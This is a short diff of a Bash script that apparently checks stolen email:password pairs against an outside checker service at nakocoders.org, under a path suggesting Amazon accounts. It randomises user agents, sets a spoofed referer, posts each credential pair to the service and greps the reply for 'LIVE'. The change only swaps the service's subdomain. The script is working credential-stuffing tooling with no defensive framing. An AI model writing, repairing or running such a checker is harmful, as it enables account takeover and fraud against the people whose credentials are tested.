@@ -39,8 +39,8 @@ tatsumi(){
     ua=$(cat ua.txt | sort -R | head -1)
     duration=$SECONDS
     SECONDS=0
-    url="http://api.nakocoders.org/api/amz/check.php"
-    ref="http://api.nakocoders.org/api/amz"
+    url="http://48.nakocoders.org/api/amz/check.php"
+    ref="http://48.nakocoders.org/api/amz"
     send=$(curl -s -A "$ua" -e "$ref" -X POST -d "ajax=1&do=check&mailpass=$1%7Cwkwkwkkw&delim=%7C&email=0&bank=0&card=0&info=0" "$url")
     livena=$(echo $send | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     if [[ $livena =~ "LIVE" ]]; then
